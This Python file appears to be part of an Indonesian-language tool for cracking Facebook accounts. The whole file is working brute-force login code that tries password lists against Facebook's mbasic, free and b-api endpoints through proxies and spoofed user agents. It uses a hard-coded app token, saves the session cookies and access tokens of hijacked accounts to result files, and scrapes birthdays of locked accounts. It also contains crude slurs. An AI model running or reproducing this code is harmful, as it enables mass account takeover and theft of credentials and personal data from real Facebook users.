# hallo bro :v

from modul import *
from .useragent import *
from .proxylistt import *
from .list_pass import pw_list
from datetime import datetime
import concurrent.futures
import urllib.request
import random

if os.path.exists("saya_gans/ngewe/.useragent"):
	if os.path.getsize("saya_gans/ngewe/.useragent")!=0:
		ghbbjiuGghgYyhhhjjjjjhyhhgtujnkkkiDghgtjkiukloudgjbfjii76jhghvfjjjko9ihfddfzayjhfujgjkhhjhunhgkhui77577u6jjghhfhkhhnhgghh__jjthjgkoio9yrkfjyhgryutiuuykkooyshjbvdeaathhf__hhvvvbnnnnmjhewyjheyjhhgttr665yhhjjghjgdsfjnnjDgggdgghyyjhhhhhyyyyyyyyatggg=open("saya_gans/ngewe/.useragent").read().strip()

ok,cp,cout,live,chek,kumpul,lahir,ua__=0,0,0,[],[],[],"",random.choice(["Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","NokiaC5-00/061.005 (SymbianOS/9.3; U; Series60/3.2 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525 3gpp-gba","Mozilla/5.0 (Linux; Tizen 2.3; SmartHub; SMART-TV; SmartTV; U; Maple2012) AppleWebKit/538.1+ (KHTML, like Gecko) TV Safari/538.1+"])

class crack:
	def __init__(self,url,user):
		
		print()
		self.url=url
		self.user=user
		self.token=open("cookies/token.txt").read() if os.path.exists("cookies/token.txt") else None
		self.naroskeun()

	def naroskeun(self):
		NAROSKEUN=input(" USE MANUAL PASSWORDS? Y/N : ")
		while NAROSKEUN in (""," "):
			print(" ! DONT BE EMPTY")
			NAROSKEUN=input(" USE MANUAL PASSWORDS? Y/N : ")
		if NAROSKEUN in tuple("yY"):
			print(" * input random passwords")
			print(" * EXAMPLE : first123,pakistan,223344,sayang,name123")
			password=input(" ? set password : ")
			while len(password) < 6:
				print(" ! DONT BE EMPTY" if password in (""," ") else " ! password minimal 6 karakter")
				password=input(" ? set password : ")
			print(" ->> [CHOSE METHOD LOGIN]")
			print(" 1. METHOD D4VID (fast crack) [HIGHLY-RECOMEND]")
			print(" 2. METHOD SDJ-1 (slow crack) [GOOD]")
			print(" 3. METHOD SDJ-2 (slow crack) [FOR-DOB-CRACK]")
			print(" 4. METHOD SDJ-1 V2 (fast crack) [BEST]")
			print(" 5. METHOD SDJ-2 V2 (fast crack) [BEST]")
			self.awokawok_ngentod(password)
		if NAROSKEUN in tuple("nN"):
			print(" --> [CHOSE METHOD LOGIN]")
			print(" 1. METHOD D4VID (fast crack) [HIGHLY-RECOMEND]")
			print(" 2. METHOD SDJ-1 (slow crack) [GOOD]")
			print(" 3. METHOD SDJ-2 (slow crack) [FOR-DOB-CRACK]")
			print(" 4. METHOD SDJ-1 V2 (fast crack) [BEST]")
			print(" 5. METHOD SDJ-2 V2 (fast crack) [BEST]")
			self.awokawok_ngentod()
		else:
			print(" ! ERROR");self.naroskeun()
	
	def lovyu(self,username,password,url,**data):
		ses=req.session()
		respon=ses.get(url+"/login/?next&ref=dbl&fl&refid=8")
		parsing=parser(respon.text,"html.parser")
		action=parsing.find("form",{"method":"post"})["action"]
		kecuali=["sign_up","_fb_noscript"]
		for INPUT in parsing.find_all("input",{"name":True,"value":True}):
			if INPUT["name"] in kecuali:
				continue
			else:
				data.update({INPUT["name"]:INPUT["value"]})
		data.update({"email":username,"pass":password})
		ses.headers.update({"Host":url.split("//")[1],"cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ghbbjiuGghgYyhhhjjjjjhyhhgtujnkkkiDghgtjkiukloudgjbfjii76jhghvfjjjko9ihfddfzayjhfujgjkhhjhunhgkhui77577u6jjghhfhkhhnhgghh__jjthjgkoio9yrkfjyhgryutiuuykkooyshjbvdeaathhf__hhvvvbnnnnmjhewyjheyjhhgttr665yhhjjghjgdsfjnnjDgggdgghyyjhhhhhyyyyyyyyatggg,"content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","referer":url+"/login/?next&ref=dbl&fl&refid=8"})
		ses.post(url+action,data=data,proxies=dict(http=proxsi),allow_redirects=False)
		return ses.cookies.get_dict()
	
	def api(self,username,password,url,**data):
		ses=req.session()
		ses.headers.update({"Host":url.split("//")[1],"cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","referer":url+"/login.php","user-agent":ua__})
		data.update({"email":username,"pass":password,"login":"submit"})
		ses.post(url+"/login.php",data=data,proxies=dict(http=proxsi),allow_redirects=False)
		return ses.cookies.get_dict()

	def bapi(self,username,password):
		ses=req.session()
		ses.headers.update({"x-fb-connection-bandwidth":str(random.randint(20000,40000)),"x-fb-sim-hni":str(random.randint(20000,40000)),"x-fb-net-hni":str(random.randint(20000,40000)),"x-fb-connection-quality":"EXCELLENT","x-fb-connection-type":"cell.CTRadioAccessTechnologyHSDPA","user-agent":"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11","content-type":"application/x-www-form-urlencoded","x-fb-http-engine":"Liger"})
		ses.params.update({"access_token":"350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format":"JSON","sdk_version":"2","email":username,"locale":"en_US","password":password,"sdk":"ios","generate_session_cookies":"1","sig":"3f555f99fb61fcd7aa0c44f58f522ef6"})
		return ses.get("https://b-api.facebook.com/method/auth.login").json()
	
	def awokawok_ngentod(self,manual=None):
		pilih=input(" CHOSE--> : ")
		while pilih in (""," "):
			print(" ! DONT BE EMPTY")
			pilih=input(" CHOSE--> : ")
		url="https://{}.facebook.com"
		speed=50 if manual is None else 30
		if speed==30:
			speed=50 if len(manual.split(",")) <= 5 else speed
		if pilih in ("1","01"):
			print(" * token found :D" if self.token else " ! token not found")
			tod=self.awikwok()
			self.attack(self.bapi,speed,manual,url,tod)
			self.result()
		if pilih in ("2","02"):
			print(" * token found :D" if self.token else " ! token not found")
			tod=self.awikwok()
			self.attack(self.lovyu,speed,manual,url.format("free"),tod)
			self.result()
		if pilih in ("3","03"):
			print(" * token found :D" if self.token else " ! token not found")
			tod=self.awikwok()
			self.attack(self.lovyu,speed,manual,url.format("mbasic"),tod)
			self.result()
		if pilih in ("4","04"):
			print(" * token found :D" if self.token else " ! token not found")
			tod=self.awikwok()
			self.attack(self.api,speed,manual,url.format("free"),tod)
			self.result()
		if pilih in ("5","05"):
			print(" * token found :D" if self.token else " ! token not found")
			tod=self.awikwok()
			self.attack(self.api,speed,manual,url.format("mbasic"),tod)
			self.result()
		else:
			print(" ! ERROR");self.awokawok_ngentod(manual)
			
	def attack(self,login,speed,password,url,tolol):
		for pengguna in self.user:
			membagi=pengguna.split("(Aap Gans)")
			if password:
				if "first" in password:
					if len(membagi[1].split(" "))!=0:
						kumpul.append({"username":membagi[0],"password":password.replace("first",membagi[1].split(" ")[0].lower()).split(",")})
				else:
					kumpul.append({"username":membagi[0],"password":password.split(",")})
			else:
				kumpul.append({"username":membagi[0],"password":pw_list(membagi,login)})
		print(" * crack started\n * press ctrl+z to stop\n")
		with concurrent.futures.ThreadPoolExecutor(max_workers=speed) as U:
			if "bapi" in str(login):
				for x in kumpul:
					U.submit(self.log_bapics,x["username"],x["password"],login,tolol)
			else:
				for x in kumpul:
					U.submit(self.log_mbasic,x["username"],x["password"],login,url,tolol)

	def log_mbasic(self,username,list_password,login,url,ttl):
		try:
			global ok,cp,cout,lahir
			for password in list_password:
				rincian=login(username,password,url)
				if "c_user" in rincian:
					ok+=1
					(lambda cookies,uid: self.save(f"\x1b[1;32m SUCCESS-[SDJ√] {uid}|{password}|{cookies}","result/live.txt",live))((lambda: ";".join([_+"="+__ for _,__ in rincian.items()]))(),rincian['c_user']);break
				if "checkpoint" in rincian:
					cp+=1
					uid=json.loads(urllib.request.unquote(rincian["checkpoint"]))["u"]
					if ttl:
						lahir=req.get("https://graph.facebook.com/{}/?access_token={}".format(str(uid),self.token)).json()
						lahir="|"+lahir["birthday"] if "birthday" in lahir else ""
					self.save(f"\x1b[1;33m APPROVAL-NEEDED-[SDJ×] {uid}|{password}{lahir}","result/chek.txt",chek);break
				else:
					continue
			cout+=1
			print(f"\r * crack {cout}/{len(self.user)} ok:-{ok} cp:-{cp}",end="")
		except koneksi_error:
			self.log_mbasic(username,list_password,login,url,ttl)
		except:
			pass

	def log_bapics(self,username,list_password,login,ttl):
		try:
			global ok,cp,cout,lahir
			for password in list_password:
				rincian=login(username,password)
				if "session_key" in str(rincian) and "EAAA" in str(rincian):
					ok+=1
					(lambda token,uid:self.save(f"\x1b[1;32m SUCCESS-[SDJ√]{uid}|{password}|{token}","result/live.txt",live))(rincian["access_token"],rincian["uid"]);break
				if "www.facebook.com" in rincian["error_msg"]:
					cp+=1
					uid=username
					if "request_args" in rincian:
						#SDJ
						for x in rincian["request_args"]:
							if "email" in x["key"]:
								uid=x["value"];break
					if ttl:
						lahir=req.get("https://graph.facebook.com/{}/?access_token={}".format(str(uid),self.token)).json()
						lahir="|"+lahir["birthday"] if "birthday" in lahir else ""
					self.save(f"\x1b[1;33m APPROVAL-NEEDED-[SDJ×]{uid}|{password}{lahir}","result/chek.txt",chek);break
				else:
					continue
			cout+=1
			print(f"\r * crack {cout}/{len(self.user)} ok:-{ok} cp:-{cp}",end="")
		except koneksi_error:
			self.log_bapics(username,list_password,login,ttl)
		except:
			pass
				
	def save(self,*memek):
		view=memek[0]
		print(f"\r {view}\x1b[0m\n",end="")
		open(memek[1],"a").write(re.findall("> (.+)",view)[0]+"\n")
		memek[2].append(view)

	def result(self):
		if len(live)!=0 or len(chek)!=0:
			print(f"\n\n * done bro\n * live/chek : {len(live)}/{len(chek)}")
			if len(live)!=0:
				print(" * ok save : result/live.txt")
			if len(chek)!=0:
				print(" * cp save : result/chek.txt")
			exit()
		else:
			exit("\n\n process compilete")

	def awikwok(self):
		if self.token:
			n=input(" ? crack again Y/T : ")
			if n in tuple("yY"):
				return True
			if n in tuple("tT"):
				return False
			else:
				print(" ! isi yang bener ngentod")
				return self.awikwok()
